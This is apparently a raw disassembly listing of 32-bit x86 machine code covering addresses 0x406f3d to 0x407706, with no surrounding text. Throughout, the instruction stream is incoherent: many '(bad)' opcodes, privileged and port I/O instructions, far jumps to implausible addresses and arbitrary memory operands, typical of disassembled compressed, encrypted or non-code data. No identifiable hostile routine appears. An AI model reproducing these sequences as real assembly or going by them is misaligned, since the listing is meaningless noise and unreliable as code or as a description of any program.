  406f3d:	fiadd  WORD PTR [edi+0x25]
  406f40:	jl     0x406fc1
  406f42:	jnp    0x406fa1
  406f44:	cli    
  406f45:	add    al,0xb0
  406f47:	cmp    bl,BYTE PTR [ebx-0x18c95412]
  406f4d:	popf   
  406f4e:	inc    esp
  406f4f:	pop    ebx
  406f50:	lods   eax,DWORD PTR ds:[esi]
  406f51:	sub    BYTE PTR [ebx],bl
  406f53:	inc    edx
  406f54:	mov    ds:0x3f817d62,al
  406f59:	repz mov dl,0xd4
  406f5c:	repnz sti 
  406f5e:	mov    bh,BYTE PTR [ebp+ebx*1+0xb0d4cc]
  406f65:	lahf   
  406f66:	les    ecx,FWORD PTR [edx+0x3d4d2dd7]
  406f6c:	cli    
  406f6d:	xchg   edx,eax
  406f6e:	jmp    0xa72f1f4d
  406f73:	jae    0x406efa
  406f75:	imul   esi,DWORD PTR ds:0xd2d2245e,0xb6ad945f
  406f7f:	sub    BYTE PTR ds:0xeda28fd,ch
  406f85:	fstp   DWORD PTR [ebp+eiz*8-0x5133ef91]
  406f8c:	inc    ecx
  406f8d:	sbb    esp,DWORD PTR [edi+0x50]
  406f90:	add    BYTE PTR ds:0x144fdabe,0xd6
  406f97:	(bad)  [ecx-0x15]
  406f9a:	rol    DWORD PTR [ebx+0x27],cl
  406f9d:	mov    al,0xb0
  406f9f:	xchg   BYTE PTR [ebx-0x53f1ba4c],dh
  406fa5:	in     al,dx
  406fa6:	mov    DWORD PTR [ecx+0x16],ecx
  406fa9:	dec    ebx
  406faa:	in     eax,0xf7
  406fac:	ja     0x406f82
  406fae:	mov    WORD PTR [ecx-0x5608f1b3],?
  406fb4:	addr16 inc ecx
  406fb6:	sub    ah,bh
  406fb8:	pusha  
  406fb9:	mov    ds:0xfb89651c,al
  406fbe:	and    DWORD PTR [ecx+0xb17531],edi
  406fc4:	and    ebx,DWORD PTR [ebp+0x3f6b252f]
  406fca:	popf   
  406fcb:	xor    ah,BYTE PTR [esi-0x32]
  406fce:	js     0x406fd2
  406fd0:	mov    esi,0x758b23dc
  406fd5:	sti    
  406fd6:	shr    DWORD PTR ds:0xfc1df175,0x2f
  406fdd:	inc    ebx
  406fdf:	out    dx,al
  406fe0:	fld    TBYTE PTR ds:0x38e210c3
  406fe6:	sbb    eax,DWORD PTR [esi-0x6e]
  406fe9:	dec    edi
  406fea:	int3   
  406feb:	scas   eax,DWORD PTR es:[edi]
  406fec:	mov    dl,0x1e
  406fee:	test   DWORD PTR [ecx-0x2c],ecx
  406ff1:	jge    0x407053
  406ff3:	(bad)  
  406ff5:	ds out dx,eax
  406ff7:	lds    esp,FWORD PTR [eax+0x55]
  406ffa:	(bad)  
  406ffc:	imul   ebp,DWORD PTR [ecx-0xa],0x3c74e699
  407003:	mov    ah,BYTE PTR [ecx-0x75700193]
  407009:	push   esi
  40700a:	js     0x40703a
  40700c:	push   esp
  40700d:	cmp    ebx,DWORD PTR [esi]
  40700f:	adc    bl,BYTE PTR [edx]
  407011:	inc    al
  407013:	popa   
  407014:	je     0x407010
  407016:	jle    0x40702d
  407018:	inc    ebx
  407019:	popa   
  40701a:	leave  
  40701b:	push   eax
  40701c:	jmp    0x24d5:0x6cf98479
  407023:	adc    al,0xdf
  407025:	xor    al,0x79
  407027:	aaa    
  407028:	xchg   ebx,eax
  407029:	test   eax,0xa51c6587
  40702e:	sti    
  40702f:	mov    BYTE PTR [edx-0x65],ah
  407032:	addr16 sub bl,ch
  407035:	pop    edi
  407036:	fcmovnb st,st(2)
  407038:	sub    bh,ch
  40703a:	dec    edi
  40703b:	inc    ebp
  40703c:	and    eax,0xd92fc6d1
  407041:	ins    DWORD PTR es:[edi],dx
  407042:	cmp    al,BYTE PTR [ecx+0x2c]
  407045:	mov    esi,0xa705d458
  40704a:	fcom   DWORD PTR [edi]
  40704c:	fisub  WORD PTR [eax+0x5]
  40704f:	pop    ecx
  407051:	fsubr  DWORD PTR [ebx-0x4e748726]
  407057:	push   0xffffffb0
  407059:	mov    edx,0x401f11ce
  40705e:	mov    esi,0xb109c62c
  407063:	mov    ch,0x6d
  407065:	std    
  407066:	int    0x83
  407068:	push   esp
  407069:	mov    edi,0x8ec92acc
  40706e:	mov    ah,0x35
  407070:	jbe    0x4070cd
  407072:	jmp    0x892cf5a1
  407077:	int3   
  407078:	mov    eax,ds:0x7c49b4f1
  40707d:	inc    esi
  40707e:	inc    edx
  40707f:	push   0xffffffd8
  407081:	jl     0x407054
  407083:	not    BYTE PTR [eax]
  407085:	mov    esp,0x47c86465
  40708a:	push   ebx
  40708b:	icebp  
  40708c:	xchg   ebp,eax
  40708d:	int3   
  40708e:	xor    al,0xc5
  407090:	inc    edi
  407091:	sbb    ebp,edi
  407093:	mov    ch,0x3
  407095:	ins    BYTE PTR es:[edi],dx
  407096:	dec    edx
  407097:	add    ah,BYTE PTR [esi]
  407099:	es add ebp,edi
  40709c:	popa   
  40709d:	bound  eax,QWORD PTR [ecx-0x89afdbe]
  4070a3:	inc    esi
  4070a4:	jle    0x407107
  4070a6:	xchg   esi,eax
  4070a7:	mov    gs,WORD PTR [edx]
  4070a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070aa:	jae    0x407030
  4070ac:	popa   
  4070ad:	inc    ebx
  4070ae:	pushf  
  4070af:	pop    edx
  4070b0:	ja     0x40707c
  4070b2:	add    BYTE PTR [edx+0x3],0x54
  4070b6:	aaa    
  4070b7:	mov    BYTE PTR [edi+0x323ffcc9],bh
  4070bd:	sub    edi,ecx
  4070bf:	mov    ds:0x6ee39234,eax
  4070c4:	out    0xf8,al
  4070c6:	stc    
  4070c7:	in     eax,dx
  4070c8:	shl    BYTE PTR [edi+ebx*4+0x68b2724a],1
  4070cf:	sti    
  4070d0:	retf   0x9ca8
  4070d3:	xchg   edx,eax
  4070d4:	aam    0x93
  4070d6:	pop    ds
  4070d7:	(bad)  
  4070d8:	push   ss
  4070d9:	rcl    esp,0xc4
  4070dc:	sbb    eax,0x73adcc24
  4070e1:	xchg   ebp,eax
  4070e2:	clc    
  4070e3:	loope  0x40710c
  4070e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070e6:	pop    ss
  4070e7:	ret    0x3fff
  4070ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070eb:	out    0x34,eax
  4070ed:	sub    al,0x3e
  4070ef:	xor    eax,0x4d130b3a
  4070f4:	cdq    
  4070f5:	pushf  
  4070f6:	dec    eax
  4070f7:	fcmovb st,st(6)
  4070f9:	into   
  4070fa:	push   0x2de6bca0
  4070ff:	dec    ebp
  407100:	lahf   
  407101:	mov    edx,0x83422edb
  407106:	mov    fs,WORD PTR [eax+ebp*2]
  407109:	cs mov eax,0x5267c9f8
  40710f:	in     al,0x56
  407111:	push   0x6f50d0ae
  407116:	jmp    0x407142
  407118:	test   al,bl
  40711a:	lea    edi,[ecx-0x14]
  40711d:	daa    
  40711e:	mov    dl,0x10
  407120:	pop    ebp
  407121:	inc    edi
  407122:	out    0xa7,eax
  407124:	and    al,0x4a
  407126:	adc    bh,BYTE PTR [ebx-0x48ca3cf2]
  40712c:	les    esp,FWORD PTR [eax]
  40712e:	push   ss
  40712f:	xchg   edx,eax
  407130:	xchg   edx,eax
  407131:	add    eax,0xac40df12
  407136:	shl    BYTE PTR [eax+0x3f],1
  407139:	es nop
  40713b:	inc    edi
  40713c:	stos   DWORD PTR es:[edi],eax
  40713d:	lock pop ss
  40713f:	mov    esi,0x23672ecb
  407144:	adc    eax,0x8e56a231
  407149:	inc    ecx
  40714a:	mov    WORD PTR [esi-0x1e9a2c30],cs
  407150:	pop    eax
  407151:	pop    esp
  407152:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407153:	aam    0xae
  407155:	pop    es
  407156:	mov    ch,0xb1
  407158:	iret   
  407159:	push   ss
  40715a:	in     eax,dx
  40715b:	mov    edi,0xaf2b8e9e
  407160:	add    al,0x87
  407162:	(bad)  
  407164:	push   0x8bc9d46c
  407169:	cmp    eax,DWORD PTR [edi+0x5a]
  40716c:	pop    edx
  40716d:	mov    ds,WORD PTR [edi+eax*1+0xdca34f6]
  407174:	leave  
  407175:	shr    bh,0x52
  407178:	in     al,dx
  407179:	mov    ah,0xd9
  40717b:	sti    
  40717c:	ds mov bh,0x99
  40717f:	mov    BYTE PTR [esi+0x7da1d251],bl
  407185:	xchg   edi,eax
  407186:	push   es
  407187:	mov    ch,0xfe
  407189:	or     ch,BYTE PTR [ecx]
  40718b:	sub    DWORD PTR [ebx],eax
  40718d:	mov    ah,0x25
  40718f:	jl     0x4071b3
  407191:	pop    ds
  407192:	push   es
  407193:	fdiv   DWORD PTR [ecx-0x687f70b6]
  407199:	jg     0x4071fb
  40719b:	inc    edi
  40719c:	(bad)  
  40719d:	cmp    eax,0xc55aac4d
  4071a2:	addr16 ss int3 
  4071a5:	inc    ebx
  4071a6:	inc    ecx
  4071a7:	stos   BYTE PTR es:[edi],al
  4071a8:	xchg   DWORD PTR [eax],ebx
  4071aa:	mov    BYTE PTR [esi],dh
  4071ac:	xchg   esi,eax
  4071ad:	hlt    
  4071ae:	cmp    al,0x1c
  4071b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071b1:	mov    ecx,ebx
  4071b3:	xor    bl,0x88
  4071b6:	mov    eax,ds:0x7b8b09da
  4071bb:	and    eax,0xec6ce8f8
  4071c0:	inc    edi
  4071c1:	retf   
  4071c2:	stc    
  4071c3:	hlt    
  4071c4:	adc    BYTE PTR [edi+eax*8-0x56bf74ee],bl
  4071cb:	xor    DWORD PTR [eax+0x557dd0a9],esi
  4071d1:	mov    ds:0x8117e8f8,eax
  4071d6:	sub    BYTE PTR [edx],ah
  4071d8:	mov    dh,BYTE PTR [eax+0x5f]
  4071db:	dec    edi
  4071dc:	and    dh,BYTE PTR [edi+0xc]
  4071df:	push   ecx
  4071e0:	les    esi,FWORD PTR [edi+0x57]
  4071e3:	ss pusha 
  4071e5:	je     0x40723c
  4071e7:	retf   0x3d54
  4071ea:	mov    ecx,0xc4ac2ae4
  4071ef:	addr16 pop ebp
  4071f1:	xor    al,0xf4
  4071f3:	xchg   DWORD PTR [ebp+edi*8+0x19bf2447],edx
  4071fa:	ins    BYTE PTR es:[edi],dx
  4071fb:	repz popa 
  4071fd:	jge    0x407250
  4071ff:	cld    
  407200:	repz je 0x407219
  407203:	or     eax,0xf6651ec8
  407208:	ficomp DWORD PTR [eax-0x6f]
  40720b:	xchg   ebx,eax
  40720c:	sub    DWORD PTR [edi-0x7a],0xffffffa1
  407210:	aaa    
  407211:	dec    ebp
  407212:	out    dx,al
  407213:	inc    esi
  407214:	push   0x5329b39f
  407219:	int3   
  40721a:	loopne 0x4071d4
  40721c:	xchg   edx,eax
  40721d:	cmp    BYTE PTR [edi],0xee
  407220:	fmulp  st(0),st
  407222:	in     eax,dx
  407223:	lods   al,BYTE PTR ds:[esi]
  407224:	popf   
  407225:	sbb    al,0x5b
  407227:	fadd   DWORD PTR [ebx-0x39]
  40722a:	stos   DWORD PTR es:[edi],eax
  40722b:	push   cs
  40722c:	mov    cs,WORD PTR [ebp-0x39]
  40722f:	xor    DWORD PTR [ebp-0x8b907dc],ecx
  407235:	xor    eax,0x805b25bf
  40723a:	sub    BYTE PTR [edi+0x26],ch
  40723d:	mov    edi,0x40fa5c7b
  407242:	mov    dh,0x7
  407244:	or     eax,0x11bf08d0
  407249:	retf   
  40724a:	cdq    
  40724b:	xor    ebx,esp
  40724d:	out    dx,al
  40724e:	ds mov esi,0x5cfc279
  407254:	adc    eax,0x2b50faf0
  407259:	adc    al,0x18
  40725b:	cmp    esi,esp
  40725d:	inc    eax
  40725e:	mov    ds:0x56265016,al
  407263:	push   ecx
  407264:	mov    esi,0xe51eeefa
  407269:	into   
  40726a:	dec    ecx
  40726b:	adc    bl,BYTE PTR [eax-0x32]
  40726e:	retf   
  40726f:	mov    eax,0x5419ec87
  407274:	sub    eax,ecx
  407276:	mov    al,0xf1
  407278:	shr    BYTE PTR [ebx],1
  40727a:	clc    
  40727b:	out    dx,eax
  40727c:	xchg   ecx,eax
  40727d:	xchg   edx,eax
  40727e:	sub    al,0xdf
  407280:	xchg   edx,eax
  407281:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407282:	loop   0x40723f
  407284:	imul   ecx,edx,0x70a81138
  40728a:	pop    esi
  40728b:	shl    DWORD PTR [ebx+0x406b583a],1
  407291:	sbb    DWORD PTR [ebx+0x6581d9c6],esi
  407297:	jno    0x407219
  407299:	inc    esp
  40729a:	xchg   ebx,eax
  40729b:	push   ebx
  40729c:	test   BYTE PTR [ebx+0x6c2d5ac5],bl
  4072a2:	lds    esp,FWORD PTR fs:[ebx-0x1c]
  4072a6:	mov    ds:0x9076437,al
  4072ab:	sti    
  4072ac:	adc    BYTE PTR [eax-0x18],bl
  4072af:	sbb    esi,DWORD PTR [ebx]
  4072b1:	aam    0x9
  4072b3:	or     al,0x17
  4072b5:	cdq    
  4072b6:	stos   DWORD PTR es:[edi],eax
  4072b7:	aad    0x0
  4072b9:	outs   dx,BYTE PTR ds:[esi]
  4072ba:	mov    cl,0xdd
  4072bc:	pop    ss
  4072bd:	adc    DWORD PTR [edx],edi
  4072bf:	dec    esi
  4072c0:	ss rcl bh,1
  4072c3:	enter  0x8754,0x98
  4072c7:	ret    0x7fd3
  4072ca:	addr16 xchg ebp,eax
  4072cc:	cmp    ecx,DWORD PTR [esi]
  4072ce:	mov    eax,DWORD PTR [edx-0x10]
  4072d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072d2:	sub    al,0x33
  4072d4:	call   0x461a6338
  4072d9:	lds    ecx,FWORD PTR [edx-0x216a2eeb]
  4072df:	xchg   esp,eax
  4072e0:	lods   al,BYTE PTR ds:[esi]
  4072e1:	xor    edi,DWORD PTR [esi+0x1a055ec]
  4072e7:	test   BYTE PTR [ebp+0x5d],dl
  4072ea:	lock cmp DWORD PTR gs:[eax+eiz*4],esi
  4072ef:	retf   
  4072f0:	scas   al,BYTE PTR es:[edi]
  4072f1:	retf   0x17ac
  4072f4:	cmp    esp,DWORD PTR [esi-0x75]
  4072f7:	cmc    
  4072f8:	std    
  4072f9:	push   es
  4072fa:	add    ah,dh
  4072fc:	dec    ebp
  4072fd:	mov    cl,0x8c
  4072ff:	xlat   BYTE PTR ds:[ebx]
  407300:	rol    bl,cl
  407302:	pop    ss
  407303:	enter  0x29ed,0xf5
  407307:	push   cs
  407308:	out    0x3,eax
  40730a:	cmp    eax,0xe9cdce5c
  40730f:	cmp    BYTE PTR [edx],al
  407311:	mov    eax,ds:0x7b873ad8
  407316:	loopne 0x40738a
  407318:	enter  0x9ed2,0xae
  40731c:	sti    
  40731d:	fst    DWORD PTR [ecx+0x14e2f50d]
  407323:	sbb    ebp,DWORD PTR [esi]
  407325:	mov    eax,0x4f503483
  40732a:	inc    ebx
  40732b:	es mov ebx,0x2f8cbe60
  407331:	mov    ch,0xee
  407333:	cmc    
  407334:	aam    0x98
  407336:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407338:	ins    DWORD PTR es:[edi],dx
  407339:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40733a:	or     ah,al
  40733c:	and    bl,BYTE PTR [edi]
  40733e:	outs   dx,BYTE PTR ds:[esi]
  40733f:	jmp    FWORD PTR [edi+0x4674170]
  407345:	jb     0x40738e
  407347:	fdivr  QWORD PTR [edi+0x5219d910]
  40734d:	jo     0x407350
  40734f:	lahf   
  407350:	xchg   esi,eax
  407351:	push   ds
  407352:	jmp    0x2e6736a7
  407357:	mov    ebx,0xd6a3a8cb
  40735c:	addr16 pop ss
  40735e:	jne    0x407342
  407360:	repz xchg ebp,eax
  407362:	fwait
  407363:	std    
  407364:	in     al,dx
  407365:	lds    edi,FWORD PTR [edx]
  407367:	popf   
  407368:	or     al,0x84
  40736a:	repz and DWORD PTR [edx+0x43699a14],esp
  407371:	mov    eax,ds:0x78322ded
  407376:	pop    ebx
  407377:	lock add dl,BYTE PTR [edx+0x30]
  40737b:	fwait
  40737c:	push   eax
  40737d:	jbe    0x4072ff
  40737f:	xor    eax,0x77d2bb92
  407384:	fdivrp st(7),st
  407386:	sub    ah,BYTE PTR [eax+0x3d]
  407389:	mov    ebp,0x60300c64
  40738e:	sub    al,0x95
  407390:	cli    
  407391:	push   ds
  407392:	jmp    0xa802ec72
  407397:	aaa    
  407398:	xor    DWORD PTR [edi],eax
  40739a:	mov    esi,0x4a74c0ec
  40739f:	xor    al,0x45
  4073a1:	pop    eax
  4073a2:	js     0x407375
  4073a4:	ror    DWORD PTR [ebx+0x25],1
  4073a7:	dec    ebp
  4073a8:	ret    0x2d5b
  4073ab:	cwde   
  4073ac:	repz test eax,0x5b8aac61
  4073b2:	jo     0x40734b
  4073b4:	retf   
  4073b5:	xchg   ebx,eax
  4073b6:	jns    0x4073c0
  4073b8:	push   ecx
  4073b9:	cmp    eax,0x4f2ded12
  4073be:	mov    ecx,0x8b32ea66
  4073c3:	imul   edi,DWORD PTR [ebx-0x4aa39516],0x9d11d73
  4073cd:	push   es
  4073ce:	cmp    DWORD PTR [ebx+0x7dce48b],esp
  4073d4:	xor    ecx,DWORD PTR [edx+0x77]
  4073d7:	cmp    eax,DWORD PTR ds:0x24418af6
  4073dd:	lahf   
  4073de:	mov    edx,0x5b3639f
  4073e3:	push   ebp
  4073e4:	mov    esi,DWORD PTR [esi]
  4073e6:	inc    eax
  4073e7:	pop    ds
  4073e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073e9:	outs   dx,DWORD PTR ds:[esi]
  4073ea:	adc    BYTE PTR ds:0x9be013ec,dh
  4073f0:	adc    edx,esp
  4073f2:	out    dx,al
  4073f3:	sbb    ebx,0xb79191be
  4073f9:	mov    eax,ds:0xf7dd74d5
  4073fe:	adc    eax,0xabb319b0
  407403:	or     eax,0xcabc1a41
  407408:	mov    esp,DWORD PTR [ecx]
  40740a:	mov    ds:0x2c720c08,eax
  40740f:	ret    0x1310
  407412:	sbb    eax,0xc49ad7e1
  407417:	jle    0x407480
  407419:	mov    ds:0xde29461,al
  40741e:	mov    dh,0x31
  407420:	jmp    FWORD PTR [ecx]
  407422:	dec    BYTE PTR [edx+0x14]
  407425:	lods   eax,DWORD PTR ds:[esi]
  407426:	pop    ebx
  407427:	stos   DWORD PTR es:[edi],eax
  407428:	jbe    0x40747a
  40742a:	test   eax,0x5ca74d90
  40742f:	or     ebx,DWORD PTR [esp+ebp*4+0x21]
  407433:	sub    al,0x9d
  407435:	push   es
  407436:	(bad)  
  407437:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407438:	pop    ds
  407439:	mov    WORD PTR [ecx+0x3e],fs
  40743c:	out    dx,eax
  40743d:	fs retf 0x5b6b
  407441:	jbe    0x40748c
  407443:	dec    ebp
  407444:	mov    ds:0xadbbc434,al
  407449:	inc    esi
  40744a:	inc    edi
  40744b:	stos   BYTE PTR es:[edi],al
  40744c:	(bad)  
  40744d:	lahf   
  40744e:	in     eax,0xa2
  407450:	fwait
  407451:	lods   eax,DWORD PTR ds:[esi]
  407452:	sub    eax,0xcf30dff4
  407457:	push   ebp
  407458:	mov    al,ch
  40745a:	mov    DWORD PTR [ebp+0x5c1c2c95],ebx
  407460:	sti    
  407461:	ret    0xf3b7
  407464:	push   ss
  407465:	bound  ecx,QWORD PTR [edx-0x483e6f00]
  40746b:	sbb    eax,edx
  40746d:	push   ds
  40746e:	fnstsw WORD PTR [esi-0x45]
  407471:	mov    edi,0x68b844d0
  407476:	dec    edx
  407477:	cmp    eax,0x1e8b0cd5
  40747c:	test   eax,0xbaf557e8
  407481:	and    al,0x9e
  407483:	sub    ah,bl
  407485:	ret    
  407486:	push   cs
  407487:	add    BYTE PTR ds:0x42904985,cl
  40748d:	cmp    eax,0x39fd9173
  407492:	ret    0xe7cf
  407495:	out    0x8b,eax
  407497:	in     al,dx
  407498:	outs   dx,BYTE PTR ds:[esi]
  407499:	sbb    dh,bl
  40749b:	out    0xb6,al
  40749d:	inc    ecx
  40749e:	push   0x979afce4
  4074a3:	inc    edx
  4074a4:	retf   0xe4d6
  4074a7:	pop    eax
  4074a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074a9:	xchg   edi,eax
  4074aa:	add    eax,eax
  4074ac:	in     eax,dx
  4074ad:	btc    DWORD PTR [ecx+0x30dfb527],ebp
  4074b4:	mov    bh,0x0
  4074b6:	rcpps  xmm4,XMMWORD PTR [ebx]
  4074b9:	retf   0x5ad1
  4074bc:	loope  0x407486
  4074be:	in     al,0xf7
  4074c0:	jecxz  0x407485
  4074c2:	pop    ebp
  4074c3:	fisttp QWORD PTR [ecx]
  4074c5:	jmp    FWORD PTR [eax-0x3643b4fa]
  4074cb:	aam    0xcb
  4074cd:	pop    esp
  4074ce:	mov    edi,0x17888a19
  4074d3:	mov    ss,WORD PTR [ecx+0x1c]
  4074d6:	fimul  WORD PTR [ebp+ebp*2-0x4ef558dd]
  4074dd:	les    ebp,FWORD PTR [edx+0x38b0a8ce]
  4074e3:	mov    bl,BYTE PTR [edi]
  4074e5:	pop    ebx
  4074e6:	adc    cl,al
  4074e8:	mov    dl,0xa3
  4074ea:	xlat   BYTE PTR ds:[ebx]
  4074eb:	sub    eax,0x76d1ef9c
  4074f0:	repnz aad 0xcc
  4074f3:	adc    DWORD PTR [ecx+0x14],ecx
  4074f6:	ins    BYTE PTR es:[edi],dx
  4074f7:	mov    bh,0x5f
  4074f9:	mov    eax,0xb0897dab
  4074fe:	retf   0xfc0f
  407501:	ds out 0x87,al
  407504:	ret    0xd403
  407507:	and    eax,0x4eccfcba
  40750c:	mov    ch,0x34
  40750e:	dec    ebp
  40750f:	cmp    DWORD PTR [ebp+0x7e],ebx
  407512:	jge    0x4074a0
  407514:	imul   ecx,DWORD PTR [edx+esi*1],0xbb5d87a9
  40751b:	pushf  
  40751c:	mov    ah,0x30
  40751e:	pop    esp
  40751f:	cmc    
  407520:	aad    0x15
  407522:	fmulp  st(1),st
  407524:	gs repnz fnstsw ax
  407528:	(bad)  
  407529:	sbb    al,0x6d
  40752b:	mov    edx,0xe5a5fc53
  407530:	fwait
  407531:	gs repz push esi
  407534:	enter  0xa9b6,0x50
  407538:	push   esi
  407539:	pop    edi
  40753a:	mov    edx,0xa1b851e6
  40753f:	ror    cl,cl
  407541:	dec    esp
  407542:	pusha  
  407543:	retf   0x7c1f
  407546:	shl    DWORD PTR [edx+0x2248cf10],cl
  40754c:	les    esi,FWORD PTR [ebx+eiz*4]
  40754f:	push   0xffffffc1
  407551:	leave  
  407552:	scas   eax,DWORD PTR es:[edi]
  407553:	jp     0x407583
  407555:	(bad)  
  407556:	pop    eax
  407557:	stos   DWORD PTR es:[edi],eax
  407558:	ror    BYTE PTR [edx+0x70cfe9f],cl
  40755e:	ins    DWORD PTR es:[edi],dx
  40755f:	mov    edi,0xb62352ab
  407564:	lods   al,BYTE PTR ds:[esi]
  407565:	xchg   al,al
  407567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407568:	mov    al,ah
  40756a:	cmp    dl,BYTE PTR [ebp-0x4ef271cf]
  407570:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407571:	pop    edx
  407572:	xchg   edx,eax
  407573:	dec    esi
  407574:	jg     0x4075ea
  407576:	das    
  407577:	outs   dx,DWORD PTR ds:[esi]
  407578:	sbb    DWORD PTR [edi],ebx
  40757a:	pop    ds
  40757b:	(bad)  [ebx+0x50b8ce3d]
  407581:	leave  
  407582:	addr16 pop esp
  407584:	vsqrtsd xmm5,xmm3,QWORD PTR [ebx+0x30f7c12e]
  40758c:	mov    bl,0x72
  40758e:	js     0x4075ce
  407590:	cmc    
  407591:	stos   DWORD PTR es:[edi],eax
  407592:	add    al,0xfb
  407594:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407595:	fwait
  407596:	push   edx
  407597:	gs cwde 
  407599:	inc    edi
  40759a:	jp     0x407534
  40759c:	add    cl,ch
  40759e:	ja     0x4075ca
  4075a0:	lfs    edi,FWORD PTR [ebx+0x1d]
  4075a4:	(bad)  
  4075a5:	in     eax,dx
  4075a6:	or     ah,ch
  4075a8:	and    bh,BYTE PTR [eax+ebx*4-0x519baaef]
  4075af:	cmp    esi,DWORD PTR [ebp+0x4689fce8]
  4075b5:	add    al,0x9a
  4075b7:	push   eax
  4075b8:	add    bl,BYTE PTR [ebp-0x2e]
  4075bb:	pop    ecx
  4075bc:	es jae 0x407591
  4075bf:	mov    BYTE PTR [ecx-0x534ca9f1],cl
  4075c5:	add    ebx,edi
  4075c7:	mov    eax,ds:0x557e1e0a
  4075cc:	xchg   bl,al
  4075ce:	push   ebx
  4075cf:	push   ss
  4075d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075d1:	(bad)  
  4075d2:	in     eax,0xe0
  4075d4:	into   
  4075d5:	rcl    DWORD PTR [ebp+ebp*8-0x44b37b68],1
  4075dc:	mov    ah,0x49
  4075de:	fwait
  4075df:	mov    ebx,0xa741c3aa
  4075e4:	dec    esi
  4075e5:	das    
  4075e6:	jbe    0x407614
  4075e8:	or     al,0x53
  4075ea:	mov    ebp,0xf561cf93
  4075ef:	imul   BYTE PTR [ecx+esi*8]
  4075f2:	jo     0x4075a1
  4075f4:	arpl   ax,bp
  4075f6:	rcl    BYTE PTR [edx],1
  4075f8:	cmp    ebp,esp
  4075fa:	aam    0xa0
  4075fc:	je     0x4075d2
  4075fe:	xchg   ebx,eax
  4075ff:	dec    eax
  407600:	mov    DWORD PTR [ecx+0x40],edi
  407603:	std    
  407604:	shl    BYTE PTR [ebx-0x17dc5eea],1
  40760a:	aad    0xb9
  40760c:	mov    ebx,0x4340c938
  407611:	dec    ebx
  407612:	xchg   edi,eax
  407613:	iret   
  407614:	mov    edi,0x848e2b
  407619:	lods   eax,DWORD PTR ds:[esi]
  40761a:	xchg   esp,eax
  40761b:	xor    DWORD PTR ds:0x33232cfb,0x20
  407622:	leave  
  407623:	mov    dh,0xa
  407625:	cmp    BYTE PTR [ebx-0x5107fbcc],bh
  40762b:	mov    ebx,0x71e35491
  407630:	std    
  407631:	inc    edx
  407632:	je     0x40763e
  407634:	scas   al,BYTE PTR es:[edi]
  407635:	fwait
  407636:	test   DWORD PTR [esi+edi*2],0x906b0eef
  40763d:	sbb    eax,ecx
  40763f:	mov    ch,0xeb
  407641:	arpl   WORD PTR [edi],bp
  407643:	retf   
  407644:	and    al,0xd7
  407646:	bound  edx,QWORD PTR [edi+0x7c]
  407649:	scas   al,BYTE PTR es:[edi]
  40764a:	dec    edi
  40764b:	js     0x407673
  40764d:	cmp    al,0x54
  40764f:	xor    al,0x13
  407651:	dec    ebp
  407652:	mov    edi,0xcb6816bc
  407657:	pop    es
  407658:	es and eax,0x34e0a8d6
  40765e:	mov    ecx,0xbbf89e0a
  407663:	add    ecx,edi
  407665:	and    DWORD PTR [ebx-0x179baed9],edx
  40766b:	adc    dh,dh
  40766d:	lock xchg edi,eax
  40766f:	push   esi
  407670:	and    dl,BYTE PTR [ebx+ebx*1]
  407673:	stc    
  407674:	ja     0x40768b
  407676:	adc    ebx,DWORD PTR [eax]
  407678:	pop    es
  407679:	daa    
  40767a:	mov    BYTE PTR [ebx],bh
  40767c:	bound  edi,QWORD PTR [ebp-0x47]
  40767f:	sbb    DWORD PTR [ebp+0x3d],0x1a
  407683:	sbb    al,0x9
  407685:	ss xchg edi,eax
  407687:	pop    edi
  407688:	std    
  407689:	stos   BYTE PTR es:[edi],al
  40768a:	push   cs
  40768b:	stos   DWORD PTR es:[edi],eax
  40768c:	dec    edi
  40768d:	or     al,0xe1
  40768f:	mov    edi,0xe17aa6e4
  407694:	mov    bl,0x26
  407696:	repz fcom QWORD PTR ds:0xed429623
  40769d:	mov    eax,ds:0xe98ea4d4
  4076a2:	jbe    0x407652
  4076a4:	fld    DWORD PTR [eax-0x491aa41b]
  4076aa:	mov    cs:0x98b6bcb7,al
  4076b0:	outs   dx,BYTE PTR ds:[esi]
  4076b1:	fstp   TBYTE PTR [edi]
  4076b3:	js     0x407698
  4076b5:	sbb    BYTE PTR [ebx-0x1b7479d0],al
  4076bb:	sbb    DWORD PTR [edx+0x6e387975],eax
  4076c1:	cmp    BYTE PTR [ecx-0x58],0x4c
  4076c5:	jl     0x407661
  4076c7:	push   cs
  4076c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076c9:	fwait
  4076ca:	hlt    
  4076cb:	pop    ds
  4076cc:	xchg   edx,eax
  4076cd:	gs push es
  4076cf:	jno    0x4076bf
  4076d1:	stc    
  4076d2:	fistp  QWORD PTR ss:[edx+0x3faf802e]
  4076d9:	(bad)  
  4076da:	mov    bh,0x15
  4076dc:	inc    edx
  4076dd:	int3   
  4076de:	jmp    DWORD PTR [ebx]
  4076e0:	adc    esp,eax
  4076e2:	adc    ch,BYTE PTR [ebx-0x35]
  4076e5:	or     eax,0xeda5718f
  4076ea:	lahf   
  4076eb:	mov    edi,0xfbe5a655
  4076f0:	push   ss
  4076f1:	lods   al,BYTE PTR ds:[esi]
  4076f2:	iret   
  4076f3:	lods   al,BYTE PTR ds:[esi]
  4076f4:	je     0x4076f7
  4076f6:	mov    ebx,0x85ea2d7a
  4076fb:	push   esi
  4076fc:	loop   0x407777
  4076fe:	out    0x3d,al
  407700:	push   ebp
  407701:	push   ebx
  407702:	dec    ebp
  407703:	mov    ch,0x12
  407705:	inc    esp
  407706:	adc    BYTE PTR [esi],bh
